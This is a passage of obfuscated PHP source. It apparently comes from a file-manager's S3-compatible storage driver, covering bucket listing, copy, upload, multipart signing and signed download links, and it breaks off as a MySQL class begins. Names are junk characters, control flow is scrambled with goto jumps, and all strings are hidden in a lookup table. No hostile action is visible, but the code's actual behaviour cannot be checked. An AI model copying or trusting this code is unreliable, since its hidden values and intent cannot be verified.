$C‡ÙÕ¼…©ğ) { if (isset($this->{$F—–ÀÍÃ“†})) { $this->{$F—–ÀÍÃ“†} = $C‡ÙÕ¼…©ğ; } } $this->endpoint = $Eéî‘ƒƒï„[$_SERVER[Äº¡•ô™Ÿ][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($a‹·¹Ó¯»Õ = "\166\x34") { $this->signVer = $a‹·¹Ó¯»Õ; $this->client->setSignatureVersion($a‹·¹Ó¯»Õ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto EƒŠ†¢Œ–; FÃèî—Ã«±: if ($e¿‚‚ÛÎ¦Ë[$B­İ¶İ‰Ï[172]] != $B­İ¶İ‰Ï[173] || $e¿‚‚ÛÎ¦Ë[$B­İ¶İ‰Ï[174]] != $B­İ¶İ‰Ï[173]) { return !1; } $e¬ÚÆïŸ“¢ = array_map($B­İ¶İ‰Ï[175], $e¿‚‚ÛÎ¦Ë[$B­İ¶İ‰Ï[176]]); if (!is_array($e¬ÚÆïŸ“¢)) { $e¬ÚÆïŸ“¢ = array(); } goto DÏ¨ŸùÖÜÁ; DÏ¨ŸùÖÜÁ: $CùñéßŠ = array($B­İ¶İ‰Ï[177], $B­İ¶İ‰Ï[178], $B­İ¶İ‰Ï[179], $B­İ¶İ‰Ï[180], $B­İ¶İ‰Ï[181]); $d£ßñáˆö = array_diff($CùñéßŠ, $e¬ÚÆïŸ“¢); return empty($d£ßñáˆö); goto aĞ£Ì•¡Æ÷; EƒŠ†¢Œ–: $B­İ¶İ‰Ï =& $_SERVER[Äº¡•ô™Ÿ]; $e¿‚‚ÛÎ¦Ë = $this->getBucketCors(); if (!$e¿‚‚ÛÎ¦Ë || !is_array($e¿‚‚ÛÎ¦Ë)) { return !1; } goto FÃèî—Ã«±; aĞ£Ì•¡Æ÷: } public function mkfile($c¹¿ÜâöêŠ, $Câ¸³†ö‹æ = '', $F—¨Ñ‰¨·¯ = REPEAT_RENAME) { $A¹ÙÛ§…½ = $this->setContent($c¹¿ÜâöêŠ, $Câ¸³†ö‹æ); if ($A¹ÙÛ§…½ !== !1) { return $this->getPathOuter($c¹¿ÜâöêŠ); } return !1; } public function mkdir($E³¦¼½ˆ¾¡, $c‚‹äŠÄèó = REPEAT_SKIP) { if (empty($E³¦¼½ˆ¾¡)) { return !1; } if ($this->_isFolder($E³¦¼½ˆ¾¡)) { return $this->getPathOuter($E³¦¼½ˆ¾¡); } $b·µµÛ‹ë = $this->setContent($E³¦¼½ˆ¾¡, $_SERVER[Äº¡•ô™Ÿ][33], !0); if ($b·µµÛ‹ë !== !1) { return $this->getPathOuter($E³¦¼½ˆ¾¡); } return !1; } public function copyFile($D¡ºˆ‚ßìâ, $A„›“ØóˆÛ, $F¸ˆÕ‘ ÈÍ = array()) { $A»Å³âöº‚ =& $_SERVER[Äº¡•ô™Ÿ]; $cìó÷õğ‚í = $this->objectMeta($D¡ºˆ‚ßìâ); if (!$cìó÷õğ‚í) { return !1; } if ($cìó÷õğ‚í[$A»Å³âöº‚[77]] <= 1024 * 1024 * 200) { $aŒ‚«±²¤“ = $this->client->copyObject($this->bucket, $D¡ºˆ‚ßìâ, $this->bucket, $A„›“ØóˆÛ, $A»Å³âöº‚[182], $F¸ˆÕ‘ ÈÍ); } else { $aŒ‚«±²¤“ = $this->client->multiCopyObject($this->bucket, $D¡ºˆ‚ßìâ, $this->bucket, $A„›“ØóˆÛ, $F¸ˆÕ‘ ÈÍ); } $aŒ‚«±²¤“ = $aŒ‚«±²¤“ ? $this->getPathOuter($A„›“ØóˆÛ) : !1; return $aŒ‚«±²¤“; } public function moveFile($b”±¨ôš, $c¡Îµ¾õ‰¬) { if ($this->copyFile($b”±¨ôš, $c¡Îµ¾õ‰¬)) { $this->delFile($b”±¨ôš); return $this->getPathOuter($c¡Îµ¾õ‰¬); } return !1; } public function delFile($d¡Ş«À»™Í) { return $this->client->deleteObject($this->bucket, $d¡Ş«À»™Í); } public function delFolder($FÓ‰Û¬ä) { goto eø‡ ç†Üæ; eø‡ ç†Üæ: $D›ÒÊÁŸÄ =& $_SERVER[Äº¡•ô™Ÿ]; $c«ŒçëÄø÷ = $this->listObjs($FÓ‰Û¬ä); if (!$c«ŒçëÄø÷) { $FÓ‰Û¬ä = trim($FÓ‰Û¬ä, $D›ÒÊÁŸÄ[8]); if (!empty($FÓ‰Û¬ä)) { $FÓ‰Û¬ä .= $D›ÒÊÁŸÄ[8]; } return $this->delFile($FÓ‰Û¬ä); } goto døÛÑ¶éó˜; døÛÑ¶éó˜: $Fƒá´ø÷ò = $aÖæâ³Úİ = 0; $Eƒ‹‘ã’ßñ = array_chunk(array_keys($c«ŒçëÄø÷), 1000); foreach ($Eƒ‹‘ã’ßñ as $A³‘·Ô£‰…) { $Fƒá´ø÷ò++; $aÖæâ³Úİ += (int) $this->client->deleteObjects($this->bucket, $A³‘·Ô£‰…); } goto bªê‘Ü†»; bªê‘Ü†»: return $Fƒá´ø÷ò === $aÖæâ³Úİ ? !0 : !1; goto Fãæ—„–òõ; Fãæ—„–òõ: } public function rename($fÄÙ¯²ÒÀõ, $EáŒƒ¢¬³) { return $this->renameObject($fÄÙ¯²ÒÀõ, $EáŒƒ¢¬³); } public function listPath($dÏªõôÄç, $E©æææ–Â = false) { $cë×ŒÏ£ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $cÕÛÖŸÅ¬ = $this->listObjs($dÏªõôÄç, null, null, $cë×ŒÏ£ƒ[8]); $Eâ„±¸ªˆã = array($cë×ŒÏ£ƒ[74] => array(), $cë×ŒÏ£ƒ[73] => array()); foreach ($cÕÛÖŸÅ¬ as $A§‘ËŞôİ => $F»²­Æ“) { if ($A§‘ËŞôİ == $cë×ŒÏ£ƒ[8]) { continue; } if (isset($F»²­Æ“[$cë×ŒÏ£ƒ[183]])) { $Eâ„±¸ªˆã[$cë×ŒÏ£ƒ[74]][] = $this->folderInfo($F»²­Æ“[$cë×ŒÏ£ƒ[183]], $E©æææ–Â); } else { if (substr($F»²­Æ“[$cë×ŒÏ£ƒ[28]], -1) == $cë×ŒÏ£ƒ[8]) { continue; } $Eâ„±¸ªˆã[$cë×ŒÏ£ƒ[73]][] = $this->fileInfo($F»²­Æ“[$cë×ŒÏ£ƒ[28]], $E©æææ–Â, $F»²­Æ“); } } return $Eâ„±¸ªˆã; } private function fileInfo($Eà„Ì½à, $A‰ŸÆ®ò²Œ = false, $Aù†Å«©ƒÄ = array()) { goto dõç­›Ü¨°; dø—Áá¦Ğ: if (empty($Aù†Å«©ƒÄ)) { $Aù†Å«©ƒÄ = $this->objectMeta($Eà„Ì½à); if (!$Aù†Å«©ƒÄ) { return $D¯–î›‚çÍ; } } if (isset($Aù†Å«©ƒÄ[$DÖÀî—ßƒ [187]])) { $D¯–î›‚çÍ[$DÖÀî—ßƒ [107]] = $Aù†Å«©ƒÄ[$DÖÀî—ßƒ [187]]; } if (isset($Aù†Å«©ƒÄ[$DÖÀî—ßƒ [77]])) { $D¯–î›‚çÍ[$DÖÀî—ßƒ [77]] = $Aù†Å«©ƒÄ[$DÖÀî—ßƒ [77]]; } goto cÆâÇ÷§; cÆâÇ÷§: return $D¯–î›‚çÍ; goto DØªÔÜ¾©; dõç­›Ü¨°: $DÖÀî—ßƒ  =& $_SERVER[Äº¡•ô™Ÿ]; if ($A‰ŸÆ®ò²Œ) { return array($DÖÀî—ßƒ [28] => $this->pathThis($Eà„Ì½à), $DÖÀî—ßƒ [75] => $this->getPathOuter($Eà„Ì½à), $DÖÀî—ßƒ [29] => $DÖÀî—ßƒ [164], $DÖÀî—ßƒ [157] => $this->ext($Eà„Ì½à), $DÖÀî—ßƒ [77] => isset($Aù†Å«©ƒÄ[$DÖÀî—ßƒ [77]]) ? $Aù†Å«©ƒÄ[$DÖÀî—ßƒ [77]] : 0, $DÖÀî—ßƒ [184] => 0, $DÖÀî—ßƒ [107] => 0, $DÖÀî—ßƒ [185] => !0, $DÖÀî—ßƒ [186] => !0); } $D¯–î›‚çÍ = array($DÖÀî—ßƒ [28] => $this->pathThis($Eà„Ì½à), $DÖÀî—ßƒ [75] => $this->getPathOuter($Eà„Ì½à), $DÖÀî—ßƒ [29] => $DÖÀî—ßƒ [164], $DÖÀî—ßƒ [184] => 0, $DÖÀî—ßƒ [107] => 0, $DÖÀî—ßƒ [77] => 0, $DÖÀî—ßƒ [157] => $this->ext($Eà„Ì½à), $DÖÀî—ßƒ [185] => !0, $DÖÀî—ßƒ [186] => !0); goto dø—Áá¦Ğ; DØªÔÜ¾©: } private function folderInfo($EÈÚ÷Š°Ï¡, $E‘ôÕŸçÑö = false) { goto Fƒ‚ĞÔ‰“; Fƒ‚ĞÔ‰“: $B‘§ÎÃŞ« =& $_SERVER[Äº¡•ô™Ÿ]; if ($E‘ôÕŸçÑö) { return array($B‘§ÎÃŞ«[28] => $this->pathThis($EÈÚ÷Š°Ï¡), $B‘§ÎÃŞ«[75] => $this->getPathOuter($B‘§ÎÃŞ«[8] . $EÈÚ÷Š°Ï¡), $B‘§ÎÃŞ«[29] => $B‘§ÎÃŞ«[76], $B‘§ÎÃŞ«[185] => !0, $B‘§ÎÃŞ«[186] => !0); } $a¡ë’ËßĞ¿ = array($B‘§ÎÃŞ«[28] => $this->pathThis($EÈÚ÷Š°Ï¡), $B‘§ÎÃŞ«[75] => $this->getPathOuter($B‘§ÎÃŞ«[8] . $EÈÚ÷Š°Ï¡), $B‘§ÎÃŞ«[29] => $B‘§ÎÃŞ«[76], $B‘§ÎÃŞ«[184] => 0, $B‘§ÎÃŞ«[107] => 0, $B‘§ÎÃŞ«[185] => !0, $B‘§ÎÃŞ«[186] => !0); goto F˜ˆ‚„Ó†õ; F˜ˆ‚„Ó†õ: if ($EÈÚ÷Š°Ï¡ == $B‘§ÎÃŞ«[33]) { return $a¡ë’ËßĞ¿; } $EÈÚ÷Š°Ï¡ = trim($EÈÚ÷Š°Ï¡, $B‘§ÎÃŞ«[8]) . $B‘§ÎÃŞ«[8]; $aºÓî·ì½ó = $this->objectMeta($EÈÚ÷Š°Ï¡); goto dµ’¤ŒÕ; dµ’¤ŒÕ: if (isset($aºÓî·ì½ó[$B‘§ÎÃŞ«[187]])) { $a¡ë’ËßĞ¿[$B‘§ÎÃŞ«[184]] = $aºÓî·ì½ó[$B‘§ÎÃŞ«[187]]; } return $a¡ë’ËßĞ¿; goto dã È­¾†„; dã È­¾†„: } public function listObjs($A–œ‘À—Œá, $E¾¡ÄºØÃÓ = null, $Cª¾µ”ê¶÷ = null, $A› °È¢×Œ = null) { $a§¸”¾°â =& $_SERVER[Äº¡•ô™Ÿ]; $A–œ‘À—Œá = trim($A–œ‘À—Œá, $a§¸”¾°â[8]); $bÕåÃÄ‹Í¢ = empty($A–œ‘À—Œá) ? $a§¸”¾°â[33] : $A–œ‘À—Œá . $a§¸”¾°â[8]; return $this->client->getBucket($this->bucket, $bÕåÃÄ‹Í¢, $E¾¡ÄºØÃÓ, $Cª¾µ”ê¶÷, $A› °È¢×Œ, !0); } public function has($f˜ÛÁì‘à§, $Cš„É¿·œò = false, $bÁåóåø¬Á = true) { goto bÙØæŸ¨ºÆ; bšÄ–â: if ($Cš„É¿·œò) { return array($bé°µ‹¹¢[188] => $bŸ¾•éÖñÌ, $bé°µ‹¹¢[189] => $EÁë½«ã÷); } return !1; goto EºÛÊ¥Ò¤; bÙØæŸ¨ºÆ: $bé°µ‹¹¢ =& $_SERVER[Äº¡•ô™Ÿ]; $bŸ¾•éÖñÌ = 0; $EÁë½«ã÷ = 0; goto d´¯çø¨…; d´¯çø¨…: $b—¬ºòÇÊµ = $this->listObjs($f˜ÛÁì‘à§, null, null, $bé°µ‹¹¢[8]); $b—¬ºòÇÊµ = is_array($b—¬ºòÇÊµ) ? $b—¬ºòÇÊµ : array(); foreach ($b—¬ºòÇÊµ as $C›í—›®¸¬) { if (isset($C›í—›®¸¬[$bé°µ‹¹¢[28]]) && substr($C›í—›®¸¬[$bé°µ‹¹¢[28]], -1) != $bé°µ‹¹¢[8]) { if (!$Cš„É¿·œò && $bÁåóåø¬Á) { return !0; } $bŸ¾•éÖñÌ++; } else { if (isset($C›í—›®¸¬[$bé°µ‹¹¢[183]])) { if (!$Cš„É¿·œò && !$bÁåóåø¬Á) { return !1; } $EÁë½«ã÷++; } } } goto bšÄ–â; EºÛÊ¥Ò¤: } public function listAll($cõ‘±í¬ØĞ) { $aÂ¼ÜÑßó© =& $_SERVER[Äº¡•ô™Ÿ]; $d”ÁÛøÅÂ° = $this->listObjs($cõ‘±í¬ØĞ); $EôèÑÙ†´Ğ = $cî…ã«Ï÷ = array(); foreach ($d”ÁÛøÅÂ° as $a‹¤¾†ê‰˜ => $D§Ù…ÌâÃ‚) { $EôèÑÙ†´Ğ[] = $D§Ù…ÌâÃ‚[$aÂ¼ÜÑßó©[28]]; $cî…ã«Ï÷[$a‹¤¾†ê‰˜] = $D§Ù…ÌâÃ‚[$aÂ¼ÜÑßó©[77]]; } return $this->listAllFiles($cõ‘±í¬ØĞ, $EôèÑÙ†´Ğ, $cî…ã«Ï÷); } public function canRead($b©ß†´ùï·) { $c”£ãØ‘  =& $_SERVER[Äº¡•ô™Ÿ]; $AÉ„¹îÇ–ñ = $this->client->getAccessControlPolicy($this->bucket, $b©ß†´ùï·); if (!$AÉ„¹îÇ–ñ) { return !1; } return in_array($AÉ„¹îÇ–ñ, array($c”£ãØ‘ [190], $c”£ãØ‘ [191], $c”£ãØ‘ [192])) ? !0 : !1; } public function canWrite($a™î¼„òŸß) { $CĞ»¨ê´ŠÁ =& $_SERVER[Äº¡•ô™Ÿ]; $FØº¯’µ¿ = $this->client->getAccessControlPolicy($this->bucket, $a™î¼„òŸß); if (!$FØº¯’µ¿) { return !1; } return in_array($FØº¯’µ¿, array($CĞ»¨ê´ŠÁ[190], $CĞ»¨ê´ŠÁ[191])) ? !0 : !1; } public function getContent($EµÉò³©â¬) { return $this->client->getObject($this->bucket, $EµÉò³©â¬); } public function setContent($e‹Ş¶§²‘„, $Fë¥ïàÔÖ = '', $F ìŒ›Ò­­ = false) { goto c³œŸ¦¶Î™; c³œŸ¦¶Î™: $e®Ÿë„Ò á =& $_SERVER[Äº¡•ô™Ÿ]; $e‹Ş¶§²‘„ = $F ìŒ›Ò­­ ? trim($e‹Ş¶§²‘„, $e®Ÿë„Ò á[8]) . $e®Ÿë„Ò á[8] : $e‹Ş¶§²‘„; $f•÷Š‡¾ = get_file_mime(get_path_ext($e‹Ş¶§²‘„)); goto fñ«¡®É; fñ«¡®É: $E¿§É£Ù½© = $this->client->putObject($Fë¥ïàÔÖ, $this->bucket, $e‹Ş¶§²‘„, $e®Ÿë„Ò á[182], array(), $f•÷Š‡¾); if (!$E¿§É£Ù½©) { return !1; } if ($F ìŒ›Ò­­) { return !0; } goto F»ÕÅ×™‚ñ; F»ÕÅ×™‚ñ: $E¿§É£Ù½© = $this->copyFile($e‹Ş¶§²‘„, $e‹Ş¶§²‘„, array($e®Ÿë„Ò á[193] => $E¿§É£Ù½©[$e®Ÿë„Ò á[194]])); return $E¿§É£Ù½© ? !0 : !1; goto a²åØ¿Èê; a²åØ¿Èê: } public function fileSubstr($b®¨•¬«˜È, $C‡ÊÑ¤§„…, $EÜ‹í°À÷’) { $EÀÓ­ÛèŸÓ = $C‡ÊÑ¤§„… + $EÜ‹í°À÷’ - 1; return $this->client->getObject($this->bucket, $b®¨•¬«˜È, array($_SERVER[Äº¡•ô™Ÿ][195] => "\x62\x79\x74\x65\x73\x3d{$C‡ÊÑ¤§„…}\55{$EÀÓ­ÛèŸÓ}")); } public function upload($BßéÔÁÀÎ, $b©íÚ×‚õ£, $Eé´İÛ°¥ = false, $EšÙÛ‘á²© = REPEAT_REPLACE) { $b—×¬ÍÙ¹© =& $_SERVER[Äº¡•ô™Ÿ]; $Dø¿ªÜëÉ = array($b—×¬ÍÙ¹©[193] => @md5_file($b©íÚ×‚õ£)); $Aâ”“¢Ë¶Ö = array($b—×¬ÍÙ¹©[196] => get_file_mime(get_path_ext($BßéÔÁÀÎ))); if (IO::size($b©íÚ×‚õ£) <= 1024 * 1024 * 200) { $bçáÏë´ùî = $this->client->putObjectFile($b©íÚ×‚õ£, $this->bucket, $BßéÔÁÀÎ, $b—×¬ÍÙ¹©[182], $Dø¿ªÜëÉ, $Aâ”“¢Ë¶Ö); return !empty($bçáÏë´ùî) ? $this->getPathOuter($BßéÔÁÀÎ) : !1; } $EäêåÙ•Çê = $this->client->multiUploadObject($b©íÚ×‚õ£, $this->bucket, trim($BßéÔÁÀÎ, $b—×¬ÍÙ¹©[8]), $Dø¿ªÜëÉ, $Aâ”“¢Ë¶Ö); return $EäêåÙ•Çê ? $this->getPathOuter($BßéÔÁÀÎ) : !1; } public function download($bùÉ¸¼Éœ™, $D“ÉÕÑ¿Ğ) { if (!@is_dir($this->pathFather($D“ÉÕÑ¿Ğ)) && !IO::mkdir($this->pathFather($D“ÉÕÑ¿Ğ))) { return !1; } $E÷’‹—è¼ = $this->client->getObject($this->bucket, $bùÉ¸¼Éœ™, array(), $D“ÉÕÑ¿Ğ); return $E÷’‹—è¼ !== !1 ? $D“ÉÕÑ¿Ğ : !1; } public function link($Eµ¯¥¥©èÏ, $EĞóŸ¥ñëˆ = array()) { $FÂéÚ¯ßœ =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->signVer == $FÂéÚ¯ßœ[197]) { return $this->client->getAuthenticatedURL($this->bucket, $Eµ¯¥¥©èÏ, 3600 * 12, $EĞóŸ¥ñëˆ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Eµ¯¥¥©èÏ, $FÂéÚ¯ßœ[8]), 3600 * 12, $this->region, array(), !0, $EĞóŸ¥ñëˆ); } public function fileOut($c¥×„È‘‹¨, $B™ò‹ñ×Œ° = false, $cÏÅÂ•÷ªŠ = false, $a… –ÙÄ—ø = '') { goto d×ğ»‹‹¨±; CŞ¢ò‹’–: if ($B³éòäæøª == $AŠ˜ÓØòóÑ[198]) { return parent::fileOut($c¥×„È‘‹¨, $B™ò‹ñ×Œ°, $cÏÅÂ•÷ªŠ, $a… –ÙÄ—ø); } $B™ò‹ñ×Œ° = $B™ò‹ñ×Œ° ? $AŠ˜ÓØòóÑ[199] : $AŠ˜ÓØòóÑ[200]; $d¶¯¹ÁæÜª = array($AŠ˜ÓØòóÑ[201] => $B™ò‹ñ×Œ° . $AŠ˜ÓØòóÑ[202] . rawurlencode($cÏÅÂ•÷ªŠ), $AŠ˜ÓØòóÑ[203] => $B³éòäæøª); goto D¢½©òùÏà; D¢½©òùÏà: $Bîßš®¥— = $this->link($c¥×„È‘‹¨, $d¶¯¹ÁæÜª); $this->fileOutLink($Bîßš®¥—); goto b¤Ä²îÂö‡; d×ğ»‹‹¨±: $AŠ˜ÓØòóÑ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$cÏÅÂ•÷ªŠ) { $cÏÅÂ•÷ªŠ = $this->pathThis($c¥×„È‘‹¨); } $B³éòäæøª = get_file_mime(get_path_ext($cÏÅÂ•÷ªŠ)); goto CŞ¢ò‹’–; b¤Ä²îÂö‡: } public function fileOutServer($f¾êÕ™á—¹, $e‚à÷‡ñÎ· = false, $eÂ²¬ ˜Ğá = false, $fƒ’¹àœËº = '') { parent::fileOut($f¾êÕ™á—¹, $e‚à÷‡ñÎ·, $eÂ²¬ ˜Ğá, $fƒ’¹àœËº); } public function fileOutImage($E£ÆÃ†­äá, $e›‘„±Éñ = 250) { $F­”¾»İ½ = $this->link($E£ÆÃ†­äá); $this->fileOutLink($F­”¾»İ½); } public function fileOutImageServer($D× …Û÷¯¾, $fÍÜ¼âÖˆÆ = 250) { parent::fileOutImage($D× …Û÷¯¾, $fÍÜ¼âÖˆÆ); } public function hashMd5($A•é™â¤Òº, $bÍïíèÙ‰ƒ = '') { $EğÙŠôÙçÛ =& $_SERVER[Äº¡•ô™Ÿ]; $d‚ÅÅ¡’„ = $this->objectMeta($A•é™â¤Òº); if (!$d‚ÅÅ¡’„) { return !1; } $bÍïíèÙ‰ƒ = $bÍïíèÙ‰ƒ ? $bÍïíèÙ‰ƒ : _get($d‚ÅÅ¡’„, $EğÙŠôÙçÛ[204]); $bÍïíèÙ‰ƒ = $bÍïíèÙ‰ƒ ? $bÍïíèÙ‰ƒ : _get($d‚ÅÅ¡’„, $EğÙŠôÙçÛ[194], $EğÙŠôÙçÛ[33]); return $bÍïíèÙ‰ƒ; } public function uploadFormData($cÌ“°î×²‰, $C©¹íùÖµ = 3600) { $CÚÜÒë‹Ü— =& $_SERVER[Äº¡•ô™Ÿ]; $A§‡ÕÓìŒ¬ = $this->pathFather($cÌ“°î×²‰); $Bê…¨–±”Ö = $this->client->getHttpUploadPostParams($this->bucket, $A§‡ÕÓìŒ¬, $CÚÜÒë‹Ü—[182], $C©¹íùÖµ); return array_merge((array) $Bê…¨–±”Ö, array($CÚÜÒë‹Ü—[166] => $this->getHost())); } public function multiUploadFormData($fõ¿¸“…½¦, $AÀ’„ïªÜ = 3600) { $b¸ª™†ÒÄµ =& $_SERVER[Äº¡•ô™Ÿ]; $Cš«÷ïù™Ë = gmdate($b¸ª™†ÒÄµ[205]); $BÕÉ‚‹²Ê” = array(); $EòãÛîÁ£ = $this->client->getUploadId($this->bucket, $fõ¿¸“…½¦, $BÕÉ‚‹²Ê”); if (!$EòãÛîÁ£) { return !1; } return array($b¸ª™†ÒÄµ[206] => $EòãÛîÁ£, $b¸ª™†ÒÄµ[166] => $this->getHost() . $b¸ª™†ÒÄµ[8] . $this->pathEncode($fõ¿¸“…½¦), $b¸ª™†ÒÄµ[207] => $Cš«÷ïù™Ë, $b¸ª™†ÒÄµ[89] => $fõ¿¸“…½¦); } public function multiUploadAuthData($AĞ…ºğ«¶, $E«ˆÏÙä­¸ = array()) { goto bš‚’‚ƒ†; b¿¶á¨áĞ: $c…Ÿ†ÎŒ• = implode($c©Å‘’”ÓÌ[214], $a•ÌŞÖ“ŠÜ); $d‘‰êÇ’ÈÅ = base64_encode(hash_hmac($c©Å‘’”ÓÌ[215], $c…Ÿ†ÎŒ•, $this->secret, !0)); $eÏéØ×‘… = $c©Å‘’”ÓÌ[216] . $this->accessKey . $c©Å‘’”ÓÌ[4] . $d‘‰êÇ’ÈÅ; goto bÉì«‡°Â; DÑêÇîĞ½½: $a•ÌŞÖ“ŠÜ = array($c©Å‘’”ÓÌ[209], $c©Å‘’”ÓÌ[33], $c©Å‘’”ÓÌ[116], $c©Å‘’”ÓÌ[33], "\170\55\x61\x6d\x7a\55\x64\x61\x74\145\72{$CóÏÙ©šò¡}", $c©Å‘’”ÓÌ[8] . $this->bucket . $c©Å‘’”ÓÌ[8] . $this->pathEncode($C÷¥Ê“…àš) . $b„ÓÉµ»›§); if (strpos($b„ÓÉµ»›§, $c©Å‘’”ÓÌ[210]) === 0) { $a•ÌŞÖ“ŠÜ[0] = $c©Å‘’”ÓÌ[211]; } if (isset($E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[212]]) && $E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[212]] == $c©Å‘’”ÓÌ[213]) { $a•ÌŞÖ“ŠÜ[0] = $c©Å‘’”ÓÌ[213]; } goto b¿¶á¨áĞ; bÉì«‡°Â: if (strpos($b„ÓÉµ»›§, $c©Å‘’”ÓÌ[210]) === 0) { return array($c©Å‘’”ÓÌ[217] => $eÏéØ×‘…, $c©Å‘’”ÓÌ[207] => $CóÏÙ©šò¡); } return $eÏéØ×‘…; goto c”–ÓÃŸ‹¡; fœø—ê²ÑÖ: $C÷¥Ê“…àš = $E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[89]]; unset($E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[89]]); if (isset($E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[208]])) { $E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[207]] = $CóÏÙ©šò¡; return $this->listUploadParts($C÷¥Ê“…àš, $E«ˆÏÙä­¸); } goto DÑêÇîĞ½½; bš‚’‚ƒ†: $c©Å‘’”ÓÌ =& $_SERVER[Äº¡•ô™Ÿ]; $CóÏÙ©šò¡ = isset($E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[207]]) ? $E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[207]] : gmdate($c©Å‘’”ÓÌ[205]); $b„ÓÉµ»›§ = isset($E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[157]]) ? $E«ˆÏÙä­¸[$c©Å‘’”ÓÌ[157]] : $c©Å‘’”ÓÌ[33]; goto fœø—ê²ÑÖ; c”–ÓÃŸ‹¡: } public function listUploadParts($bæ’ÆÁêö®, $b…áá¥œˆŸ = array()) { goto bÌâÙã˜—; bÌâÙã˜—: $DĞÇ”éåİñ =& $_SERVER[Äº¡•ô™Ÿ]; $f‰õÇ®ÊÏÓ = str_replace($DĞÇ”éåİñ[218], $DĞÇ”éåİñ[33], $b…áá¥œˆŸ[$DĞÇ”éåİñ[157]]); $e•ª¨ËÂó‰ = $this->client->listParts($this->bucket, $bæ’ÆÁêö®, $f‰õÇ®ÊÏÓ); goto bãïÈ¯Ÿ£…; e¥çÕâ‚ÚÇ: $d²ŒÙ›±È  = $this->multiUploadAuthData($bæ’ÆÁêö®, $b…áá¥œˆŸ); if (empty($d²ŒÙ›±È )) { return !1; } return array($DĞÇ”éåİñ[217] => $d²ŒÙ›±È , $DĞÇ”éåİñ[207] => $b…áá¥œˆŸ[$DĞÇ”éåİñ[207]], $DĞÇ”éåİñ[219] => $e•ª¨ËÂó‰); goto Cáß‡×–°ˆ; bãïÈ¯Ÿ£…: if (!$e•ª¨ËÂó‰) { return !1; } unset($b…áá¥œˆŸ[$DĞÇ”éåİñ[208]], $b…áá¥œˆŸ[$DĞÇ”éåİñ[212]]); $b…áá¥œˆŸ[$DĞÇ”éåİñ[89]] = $bæ’ÆÁêö®; goto e¥çÕâ‚ÚÇ; Cáß‡×–°ˆ: } public function getHost() { return parent::getHost() . $_SERVER[Äº¡•ô™Ÿ][8] . $this->bucket; } public function size($D’×ç¾»í”) { $FĞ¶©¨ö = $this->objectMeta($D’×ç¾»í”); return $FĞ¶©¨ö ? $FĞ¶©¨ö[$_SERVER[Äº¡•ô™Ÿ][77]] : 0; } public function info($bÙÅÄÛÚÖò) { if ($this->isFolder($bÙÅÄÛÚÖò)) { return $this->folderInfo($bÙÅÄÛÚÖò); } else { if ($this->isFile($bÙÅÄÛÚÖò)) { return $this->fileInfo($bÙÅÄÛÚÖò); } } return !1; } public function exist($a…ÎØÈ…Ì©) { return $this->isFile($a…ÎØÈ…Ì©) || $this->isFolder($a…ÎØÈ…Ì©); } public function isFile($AÙì‚ØİÖÜ) { return !$this->isFolder($AÙì‚ØİÖÜ) && $this->objectMeta($AÙì‚ØİÖÜ); } public function isFolder($A¼Åó–•Ë) { return $this->cacheMethod($_SERVER[Äº¡•ô™Ÿ][220], $A¼Åó–•Ë); } protected function objectMeta($f«¶î§íÑ‘) { return $this->cacheMethod($_SERVER[Äº¡•ô™Ÿ][221], $f«¶î§íÑ‘); } protected function _objectMeta($b›»ˆ³šÏº) { $d÷ò®Í„¤Á =& $_SERVER[Äº¡•ô™Ÿ]; $b›»ˆ³šÏº = rtrim($b›»ˆ³šÏº, $d÷ò®Í„¤Á[8]); try { $c¢ô…©èµÉ = $this->client->getObjectInfo($this->bucket, $b›»ˆ³šÏº); if (!isset($c¢ô…©èµÉ[$d÷ò®Í„¤Á[204]]) && isset($c¢ô…©èµÉ[$d÷ò®Í„¤Á[222]])) { $c¢ô…©èµÉ[$d÷ò®Í„¤Á[204]] = $c¢ô…©èµÉ[$d÷ò®Í„¤Á[222]]; } } catch (OSS\Core\OssException $E¯Àöïçö÷) { $c¢ô…©èµÉ = !1; } if (!$c¢ô…©èµÉ) { } return $c¢ô…©èµÉ; } protected function _isFolder($CÒÛ‡ö¾) { goto cò¶ƒÙÒ¶¥; DÛø÷¼ÈªÃ: $CÓ“¹ğİ¦Ş = $this->client->getBucket($this->bucket, $CÒÛ‡ö¾, null, 1); if (empty($CÓ“¹ğİ¦Ş)) { return !1; } $CÓ“¹ğİ¦Ş = array_values($CÓ“¹ğİ¦Ş); goto DÄŠÙôÀé°; DÄŠÙôÀé°: if (substr($CÓ“¹ğİ¦Ş[0][$fÖ‡¤ãØø[28]], -1) == $fÖ‡¤ãØø[8]) { return !0; } if (get_path_this($CÓ“¹ğİ¦Ş[0][$fÖ‡¤ãØø[28]]) == get_path_this($CÒÛ‡ö¾)) { return !1; } return !0; goto EßƒÁÍ§¯; cò¶ƒÙÒ¶¥: $fÖ‡¤ãØø =& $_SERVER[Äº¡•ô™Ÿ]; $CÒÛ‡ö¾ = rtrim($CÒÛ‡ö¾, $fÖ‡¤ãØø[8]); if ($CÒÛ‡ö¾ == $fÖ‡¤ãØø[33] || $CÒÛ‡ö¾ == $fÖ‡¤ãØø[8]) { return !0; } goto DÛø÷¼ÈªÃ; EßƒÁÍ§¯: } } define($_SERVER[Äº¡•ô™Ÿ][223], 1); goto FÙ…Å ò; D‰Ÿ„ÒÛÔ: class DbMysql extends Db { public function __construct($e‘ÕáÌèÑÖ = '') { $D‚‚Œ•‘´Õ =& $_SERVER[Äº¡•ô™Ÿ]; if (!extension_loaded($D‚‚Œ•‘´Õ[731])) { think_exception(think_lang($D‚‚Œ•‘´Õ[10]) . $D‚‚Œ•‘´Õ[800]); } if (!empty($e‘ÕáÌèÑÖ)) { 